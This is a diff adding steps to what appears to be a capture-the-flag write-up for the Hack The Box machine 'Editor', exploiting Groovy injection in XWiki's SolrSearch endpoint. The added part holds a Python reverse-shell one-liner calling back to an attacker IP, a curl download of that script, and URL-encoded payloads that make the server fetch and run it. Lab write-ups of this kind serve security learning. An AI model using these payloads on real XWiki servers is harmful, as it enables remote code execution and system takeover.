@@ -149,3 +149,35 @@ http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b
 The payload downloaded the output in a Solrsearch file which consists of `/etc/passwd`
 
 ![[Editor-05.png]]
+
+Now after trying a few payloads there was no success so what i did, created a python file
+pyshell.py.
+```python
+import os,pty,socket;s=socket.socket();s.connect(("10.10.X.X",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
+```
+
+Then started a python server in local machine on port 8080
+```bash
+python3 -m http.server 8080
+```
+
+After that i ran this curl command  as payload
+```cURL
+curl http://$tun0:8080/pyshell.py -o /tmp/pyshell.py
+```
+
+Full payload looked like this in URL encoded form + the endpoint and groovy script tags.
+```http
+http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22curl%20http%3A%2F%2F10%2E10%2E16%2E15%3A8080%2Fpyshell%2Epy%20%2Do%20%2Ftmp%2Fpyshell%2Epy%22.execute()%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D
+```
+
+After that i ran
+```bash
+python3 /tmp/pyshell.py
+```
+
+Full payload
+
+```http
+http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22python3%20%2Ftmp%2Fpyshell%2Epy%22.execute()%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D
+```
